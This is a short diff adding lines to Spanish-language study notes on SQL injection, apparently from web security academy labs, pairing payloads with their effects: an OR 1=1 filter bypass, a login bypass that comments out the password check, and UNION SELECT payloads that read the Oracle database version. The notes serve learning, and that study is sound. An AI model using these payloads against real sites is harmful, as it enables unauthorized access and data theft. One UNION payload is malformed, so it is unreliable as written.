@@ -24,3 +24,6 @@ OR 1=1 Y OR 1=2
 academy.net/filter?category=%27+OR+1=1-- => Filtra los todos productos
 SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 
+adminitrator'-- => Entrar con el usuario administrador y que ignore la contraseña
+?category=Gifts'+UNION+SELECT+'abc','def'+FROM+dual-- =>unimos los resultados de dos consulas con UNION
+?category=Gifts'+UNION+SELECT+banner+'abc'+FROM+v$version-- => Obtener la version de la base de datos SQL
